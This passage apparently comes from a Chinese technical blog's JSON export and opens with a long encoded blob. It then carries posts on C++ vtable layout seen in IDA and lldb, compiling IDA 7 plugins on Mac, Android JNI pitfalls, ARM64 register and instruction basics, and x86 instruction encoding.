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","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/正则表达式/"}]},{"title":"C++类结构以及vtable分析","date":"2017-12-02T10:07:00.000Z","path":"2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/","text":"C++类结构以及vtable分析 通过实验自己对一些C++数据结构的理解 实验一#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; int main(void) { Rectangle Rect; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST08_8 unsigned int v4; // eax char v6; // [rsp+10h] [rbp-20h] int v7; // [rsp+1Ch] [rbp-14h] __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h] __int64 v9; // [rsp+28h] [rbp-8h] v7 = 0; Shape::setWidth((Shape *)&amp;v6, 5); Shape::setHeight((Shape *)&amp;v6, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v6); v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9); return 0; } Rect内存布局 (lldb) x/20b $rbp-0x20 0x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 0x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。 int __cdecl main(int argc, const char **argv, const char **envp) { void *v3; // ST10_8 __int64 v4; // ST08_8 unsigned int v5; // eax __int64 v6; // ST38_8 v3 = (void *)operator new(8uLL); memset(v3, 0, 8uLL); Shape::setWidth((Shape *)v3, 5); Shape::setHeight((Shape *)v3, 7); v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v5 = Rectangle::getArea((Rectangle *)v3); v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5); std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6); return 0; } 这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。 实验二#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: // 提供接口框架的纯虚函数 virtual int getArea() = 0; void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; class Triangle: public Shape { public: int getArea() { return (width * height)/2; } }; int main(void) { Rectangle Rect; Triangle Tri; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; Tri.setWidth(5); Tri.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST20_8 unsigned int v4; // eax __int64 v5; // ST10_8 unsigned int v6; // eax char v8; // [rsp+28h] [rbp-48h] char v9; // [rsp+38h] [rbp-38h] int v10; // [rsp+4Ch] [rbp-24h] __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h] __int64 v12; // [rsp+58h] [rbp-18h] __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h] __int64 v14; // [rsp+68h] [rbp-8h] v10 = 0; Rectangle::Rectangle((Rectangle *)&amp;v9); Triangle::Triangle((Triangle *)&amp;v8); Shape::setWidth((Shape *)&amp;v9, 5); Shape::setHeight((Shape *)&amp;v9, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v9); v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12); Shape::setWidth((Shape *)&amp;v8, 5); Shape::setHeight((Shape *)&amp;v8, 7); v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;); v6 = Triangle::getArea((Triangle *)&amp;v8); v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6); v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14); return 0; } 这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下 __int64 *__fastcall Rectangle::Rectangle(Rectangle *this) { __int64 *result; // rax Shape::Shape(this); result = &amp;`vtable for&#39;Rectangle + 2; *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2; return result; } 这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下 __int64 *__fastcall Shape::Shape(Shape *this) { __int64 *result; // rax result = &amp;`vtable for&#39;Shape + 2; *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2; return result; } 其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。 这里的虚函数表地址，本质就是_DATA段的一个数据结构。 Rect的内存布局为 (lldb) x/20b $rbp-0x38 0x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x00 0x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height 去ida中查看该地址 __data:0000000100002110 ; `vtable for&#39;Rectangle __data:0000000100002110 __ZTV9Rectangle dq 0 ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o __data:0000000100002110 ; offset to this __data:0000000100002118 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle __data:0000000100002120 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void) 就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。 一点理解C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"}]},{"title":"IDA7.0 Mac 插件编译指南v1","date":"2017-11-30T06:25:09.000Z","path":"2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/","text":"先说两句前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。 搭建xcode环境在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。 我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry 然后再选择为Dynamic动态库，并导入C++标准库 接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示 这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。 Build setting这里我们将设置头文件和库的搜索路径等等。 首先设置目标架构为x86_64 然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径 经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库 这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。 最后我们还需要设置编译参数 其中__EA64__在编译64位插件时才有。 这时候build一下，如果一切顺利，应该就不会报错了。 最后说两句IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为findcrypt264.dylib表示为64位插件，则对应的32位插件名为findcry.dylib 下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。 上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了Ctrl-Alt-z的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。 完附上该插件，完。 findcrypt264.dylib_for_ida7_made_by_x1a0 参考链接 http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/ https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile ​","tags":[{"name":"ida","slug":"ida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"}]},{"title":"Android JNI踩坑笔记","date":"2017-11-28T09:00:20.000Z","path":"2017/11/28/Android_JNI_掉坑笔记 /JNI/","text":"最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。 坑1–jni方法签名分号问题这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名 jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;); 切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。 jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;); 这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。 坑2–原生方法包含默认2个参数这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数 static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...} 第一个保留参数为JNIEnv虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。 由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。 这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。 坑3—jni调用父类方法的正确姿势这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找Exception这个类的getStackTrace 方法时提示方法找不到错误，调了会才发现这个方法是在其父类Throwable中，所以正确的写法为： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;); jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;); 那么怎么调用呢？用CallNonvirtual&lt;XXX&gt;Method去调用父类中的方法，一个调用例子： jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id); 这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。 坑4—其他小坑写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如jstring与char*的转换，LOGE()函数中参数为char*的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下jni.h头文件就能找到。 还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的build.gradle文件中在defaultConfig{}加入下面的脚本： sourceSets.main{ jni.srcDirs &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39; jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39; } 无非是手动指定了jni相关的文件路径。 关于下面两类写法： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;); 原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。 完说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。 继续踩坑去了…","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"ARM64基础知识整理","date":"2017-10-21T10:07:00.000Z","path":"2017/10/21/ARM64基础知识整理/ARM64基础知识整理/","text":"ARM64基础知识整理Register参数寄存器 (X0-X7)参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。 其他特殊寄存器 X29(FP) 栈帧寄存器 类比x64中rbp X30(LR) 链接寄存器，保存函数返回地址，x64该地址保存在栈中 SP 栈顶寄存器，类比x64中 PC 指向下一条指令 寄存器 描述 CPSR 状态寄存器 Instructions mov mov x0, x1; copies x1 into x0 mov x1, 0x4141; loads the value 0x4141 in x1 str/ldr str x0, [x29]; store x0 at the address in x29 ldr x0, [x29]; load the value from the address in x29 into x0 stp/ldp stp x29, x30, [sp]; store x29 at sp and x30 at sp+8 b/br br x0; jump to the address stored in x0 ret Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there. Indexing modes Immediate offset : [base, #offset] - Index an offset directly and don’t mess with anything else ldr x0, [sp, 0x10]; load x0 from sp+0x10 Pre-indexed : [base, #offset]! - Almost the same as above, except that base+offset is written back into base. ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10 Post-indexed : [base], #offset - Use the base directly and then write base+offset back into the base ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10 函数调用demo分析__text:000000010004F0D4 SUB SP, SP, #0x70 __text:000000010004F0D8 STP X24, X23, [SP,#0x60+var_30] __text:000000010004F0DC STP X22, X21, [SP,#0x60+var_20] __text:000000010004F0E0 STP X20, X19, [SP,#0x60+var_10] __text:000000010004F0E4 STP X29, X30, [SP,#0x60+var_s0] __text:000000010004F0E8 ADD X29, SP, #0x60 __text:000000010004F0EC MOV X19, X0 __text:000000010004F0F0 ADRP X8, #___stack_chk_guard_ptr@PAGE __text:000000010004F0F4 LDR X8, [X8,#___stack_chk_guard_ptr@PAGEOFF] __text:000000010004F0F8 LDR X8, [X8] __text:000000010004F0FC STR X8, [SP,#0x60+var_38] __text:000000010004F100 ADRP X8, #classRef_Fabric@PAGE __text:000000010004F104 LDR X20, [X8,#classRef_Fabric@PAGEOFF] __text:000000010004F108 NOP __text:000000010004F10C LDR X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void * __text:000000010004F110 ADRP X8, #selRef_class@PAGE __text:000000010004F114 LDR X1, [X8,#selRef_class@PAGEOFF] ; char * __text:000000010004F118 BL _objc_msgSend ... __text:000000010004F2F4 LDP X29, X30, [SP,#0x60+var_s0] __text:000000010004F2F8 LDP X20, X19, [SP,#0x60+var_10] __text:000000010004F2FC LDP X22, X21, [SP,#0x60+var_20] __text:000000010004F300 LDP X24, X23, [SP,#0x60+var_30] __text:000000010004F304 ADD SP, SP, #0x70 __text:000000010004F308 RET 地址 栈值 描述 sp=sp-0x70 局部变量空间 sp-0x60 局部变量空间 sp-0x50 局部变量空间 sp-0x40 X24/X23 保存寄存器信息 sp-0x30 X22/X21 保存寄存器信息 sp-0x20 X20/X19 保存寄存器信息 X29 –&gt; sp-0x10 X29/X30 保存前栈基址和返回地址 sp=sp 调用前的栈顶地址 Arm32 参考 https://www.jianshu.com/p/2f4a5f74ac7a https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start https://blog.perfect.blue/ROPing-on-Aarch64 https://azeria-labs.com/assembly-basics-cheatsheet/","tags":[{"name":"ARM64","slug":"ARM64","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"}]},{"title":"X86指令编码笔记","date":"2017-10-11T03:46:13.000Z","path":"2017/10/11/x86指令编码笔记/X86指令编码笔记/","text":"由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。 x86指令编码格式很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。 x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了Intel 64和IA-32架构下的指令格式，当然，这两种架构所采用的都是x86指令编码： 从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。 指令prefixprefix简单的说来就是调整内存操作数属性，增强指令的作用等。 lock 和 repeat 其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。 operand-size override （66H — 改变默认操作数大小） 这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。 address-size override （67H — 改变默认操作数地址大小） 这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。 segment override，branch hints 和 bound 其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。 ​ | 2E | 3E | 26 | 64 | 65 | 36 || ———– | ———– | ———– | ———– | ———– | ———– || CS register | DS register | ES register | FS register | GS register | SS register | REX prefix—开启 64 位计算的基石REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个） 7 6 5 4 3 2 1 0 0 1 0 0 W R X B W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size R: 用来扩展 ModRM.reg 域 X: 用来扩展 SIB.index 域 B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg 寄存器编码表 下面来分析这条指令： mov eax,ebx 正常编码为：89 d8 下面看看在不同的REX.W和66H prefix下的不同： 48 89 d8——————&gt; mov rax,rbx 66 48 89 d8—————&gt; mov rax,rbx 66 40 89 d8—————&gt; mov ax, bx ​ 第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，REX.W = 1 第 2 条指令编码加上了 66H prefix 同时还有 REX prefix（REX.W = 1），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？实际上，很简单！48H 位于 66H 后面，66H 将被覆盖！也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 operand size 是 64 位的。 第 3 条指令编码也同样使用了 66H prefix 和 REX prefix，但是 REX.W = 0 意味着不改变原来的 operand size！在这种情况下，REX prefix 不会与 66H prefix 产生冲突，最终的作用于 66H prefix，因此 operand size 是 16 位的。 opcode整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。 一个opcode可以由一个byte组成，我们称之为1-byte opcode，当然，与之对应的，就有2-bytes opcode和3-bytes opcode。其中，后两者一般会有一个被称为escape opcode的byte进行引导，该byte的数值是0FH。所以，一般情况下，2-bytes opcode就是0FH后面再加一个byte，而3-bytes opcode就是0FH后面再加两个bytes。 ModR/MModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。 由一个byte组成，其格式如下： 7 6 5 4 3 2 1 0 mod reg R/M 1、mod：寻址模式。 2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。 mod = 